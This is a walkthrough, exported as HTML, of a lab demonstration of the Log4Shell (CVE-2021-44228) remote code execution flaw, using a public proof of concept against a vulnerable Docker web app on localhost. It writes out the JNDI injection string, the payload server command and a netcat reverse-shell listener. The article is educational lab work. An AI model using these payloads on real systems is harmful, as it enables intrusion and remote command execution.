<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>log4shell poc instructions &amp; walkthrough</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	text-indent: -1.7em;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
}

.simple-table-header {
	background: rgb(247, 246, 243);
	color: black;
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(145, 145, 142, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(187, 132, 108, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(215, 129, 58, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 148, 51, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(108, 155, 125, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(91, 151, 189, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(167, 130, 195, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(205, 116, 159, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(225, 111, 100, 1);
}
.highlight-gray_background {
	background: rgba(241, 241, 239, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.highlight-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(145, 145, 142, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(187, 132, 108, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(215, 129, 58, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 148, 51, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(108, 155, 125, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(91, 151, 189, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(167, 130, 195, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(205, 116, 159, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(225, 111, 100, 1);
}
.block-color-gray_background {
	background: rgba(241, 241, 239, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.block-color-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="8550b953-48b4-47b4-b0f5-7636100bd140" class="page sans"><header><h1 class="page-title">log4shell poc instructions &amp; walkthrough</h1></header><div class="page-body"><h1 id="793d04d6-dcef-431e-8578-f8338dfdef84" class="">Introduction</h1><p id="448aaaf8-5c6b-4526-945d-9f01ad3c2a26" class="">This article will demonstrate the log4shell Remote Code Execution (RCE) CVE-2021-44228 vulnerability. A Proof of Concept (POC) from <a href="https://github.com/kozmer/log4j-shell-poc.git">here</a> will be used as learning platform to better understand the easiness of exploiting log4j. Before we begin the journey using the POC, lets better understand the components that leads to an RCE. There are 3 major components as follows:</p><ol type="1" id="374460b5-c268-4e51-b548-c267ccf0d0fa" class="numbered-list" start="1"><li>A vulnerable web application</li></ol><p id="6d7abd44-3d1a-4223-a2ab-ef834a424b77" class="">What makes the application vulnerable to log4shell? The major reason is because of the use of a vulnerable log4j version. The vulnerable log4j plays a key role in resolving JNDI request. While this POC uses a web application, any application can be vulnerable to log4shell for as long as they use a vulnerable log4j version.</p><ol type="1" id="da3dfcd5-74d9-4eea-80eb-0313712ee7f2" class="numbered-list" start="1"><li>A HTTP &amp; LDAP server</li></ol><p id="c52b6ab0-487c-4423-8532-dd2a7a2d7e00" class="">The POC merges both HTTP and LDAP server into one. The server will return the payload that is used to exploit the targeted application or system. In this case, the payload is a Java class that create a reverse shell for an attacker to execute arbitrary commands.</p><ol type="1" id="2b1ea348-8bea-4fb2-8343-446b932483da" class="numbered-list" start="1"><li>Netcat listener</li></ol><p id="d0f8e77a-7c38-4cd9-8734-2785aaadade9" class="">The netcat listener is executed on the attacker’s machine. A reverse shell connection will be established when the payload is successfully executed in the victim. The attacker will be able to execute commands remotely from netcat.</p><h1 id="b3a75ed1-432c-4289-b73c-b4f7a25f9ae9" class="">Setting Up VM</h1><p id="48c4b241-f083-4292-ac0e-8cccd93ef24c" class="">These are the steps to set up a VM to demonstrate the RCE vulnerability that achieves log4shell. Here is the <a href="https://github.com/kozmer/log4j-shell-poc.git">reference</a> to the POC hosted on Github.</p><ol type="1" id="699b6106-6bb0-4fef-9997-5e2acb2d2e95" class="numbered-list" start="1"><li>A folder “log4j-shell-poc” is included. This folder consists of both JDK and the POC. The folder must be copied into the VM.</li></ol><ol type="1" id="b65784c9-6f69-4297-968f-8de8a51c9647" class="numbered-list" start="2"><li>Run the following command in the folder (cd /path/to/log4j-shell-poc) to install dependencies that is required to demonstrate the VM.<p id="ca377fff-648d-425a-b011-44bf9544a167" class="">pip install -r requirements.txt</p></li></ol><ol type="1" id="db1f9dd2-ff2d-4bd4-b852-e98ea93a130f" class="numbered-list" start="3"><li>Install Docker in the VM. Docker is required to run the vulnerable web application that is included in a Dockerfile. Please find and refer to the respective OS specific instructions to install Docker in the VM.</li></ol><ol type="1" id="c4895df1-051d-4756-9a07-15775cf8473c" class="numbered-list" start="4"><li>Depending on the operating system in the VM, may need to install xterm (e.g., sudo apt install xterm) to utilize the automated script run.sh.</li></ol><ol type="1" id="9bb4106f-dc3a-4caa-b73a-9e385f54a690" class="numbered-list" start="5"><li>This concludes the setting up of the environment in a VM. The next section will demonstrate on how to run the necessary components that the user can use to better understand the log4shell RCE attack.</li></ol><h1 id="7c771b88-b4be-481a-b8fb-8107696d5c57" class="">Running the VM</h1><ol type="1" id="51ca807f-c266-4a8f-88b3-f5e6f26c666b" class="numbered-list" start="1"><li>Run the run.sh script on the Desktop. This is an automated script to run all the commands below.</li></ol><ol type="1" id="2da75e04-abdc-472b-a137-20195ef147c0" class="numbered-list" start="2"><li>The victim will host the vulnerable web application in their server. The vulnerable web application is built from a Dockerfile and can be executed from its image. This is done by running the following commands in the log4j-shell-poc directory:<p id="c12ca6fe-d593-452f-82df-379e05cf86be" class="">docker build -t log4j-shell-poc .</p><p id="01571492-6708-492f-a75c-5d75eda4496e" class="">docker run --network host log4j-shell-poc</p><p id="866ae9b8-eb60-43b9-8118-721a1e95412d" class="">An example of the hosted web application at localhost:8080 is shown as follows:</p><figure id="23a26724-3473-49eb-b79a-0e428037b6dd" class="image"><a href="log4shell%20poc%20instructions%20&amp;%20walkthrough%2023a26724347349ebb79a0e428037b6dd/image1.png"><img style="width:570px" src="log4shell%20poc%20instructions%20&amp;%20walkthrough%2023a26724347349ebb79a0e428037b6dd/image1.png"/></a></figure></li></ol><ol type="1" id="b34c185b-e26a-4eee-862a-b11683aa5846" class="numbered-list" start="3"><li>The attacker will have control of two components, namely the HTTP &amp; LDAP server and the netcat listener. The attacker will craft a malicious payload (i.e., already included in the POC within poc.py) and host it on the server. The payload will be served to the victim when the victim initiates an HTTP request. To host the server on the attacker’s premises, run the following commands:<p id="36526592-a17e-49de-b607-6125bc26a7a3" class="">python3 poc.py --userip localhost --webport 8000 --lport 9001</p><p id="38ab2397-686b-43bd-8209-cc749f85a387" class="">the following messages will appear when the command is successfully executed.</p><figure id="e203f69b-f18b-4a86-9df8-d65ff6a8851e" class="image"><a href="log4shell%20poc%20instructions%20&amp;%20walkthrough%2023a26724347349ebb79a0e428037b6dd/image2.png"><img style="width:528px" src="log4shell%20poc%20instructions%20&amp;%20walkthrough%2023a26724347349ebb79a0e428037b6dd/image2.png"/></a></figure><p id="668233bb-7c6d-46a0-bb98-34034c467362" class="">An attacker will also need to run netcat to achieve reverse shell by running the following commands:</p><p id="8fbb9ff6-30d9-4a37-9ec7-cab9298bc568" class="">nc -lvnp 9001</p><p id="34f23e68-37f3-4e19-9604-7dc757ed27cb" class="">A message will appear stating that netcat is currently listening at port 9001.</p><p id="7f3efd4b-4a8d-456c-b3e0-4f19368cf46e" class="">Now, the attacker is ready to attack the victim that is currently hosting a vulnerable web application.</p></li></ol><ol type="1" id="558822c0-de28-4eec-bcdf-78f9293cb777" class="numbered-list" start="4"><li>The attacker will visit the vulnerable web application on the victim. The attacker will input the maliciously crafted JNDI string (i.e., ${jndi:ldap://localhost:1389/a} ) into any input field with the hope that log4j will log the input and gets triggered by the JNDI string.<figure id="dec3607a-8cea-40cd-bca4-c30c95e62a33" class="image"><a href="log4shell%20poc%20instructions%20&amp;%20walkthrough%2023a26724347349ebb79a0e428037b6dd/image3.png"><img style="width:563px" src="log4shell%20poc%20instructions%20&amp;%20walkthrough%2023a26724347349ebb79a0e428037b6dd/image3.png"/></a></figure></li></ol><ol type="1" id="b73c7377-6fd4-4d16-86a3-89b6aafb1b3d" class="numbered-list" start="5"><li>Upon submitting the login form with the maliciously crafted JNDI string, the attacker notice that the HTTP &amp; LDAP server have served the Exploit.class via a GET request to the victim. Additionally, the attacker will receive a notification on netcat stating that there is a connection from the victim. That way, a reverse shell is successfully achieved, and the attacker can execute arbitrary code on the victim’s system.<figure id="9c7e9b65-ec20-440a-9625-5c302f2c526f" class="image"><a href="log4shell%20poc%20instructions%20&amp;%20walkthrough%2023a26724347349ebb79a0e428037b6dd/image4.png"><img style="width:347px" src="log4shell%20poc%20instructions%20&amp;%20walkthrough%2023a26724347349ebb79a0e428037b6dd/image4.png"/></a></figure></li></ol></div></article></body></html>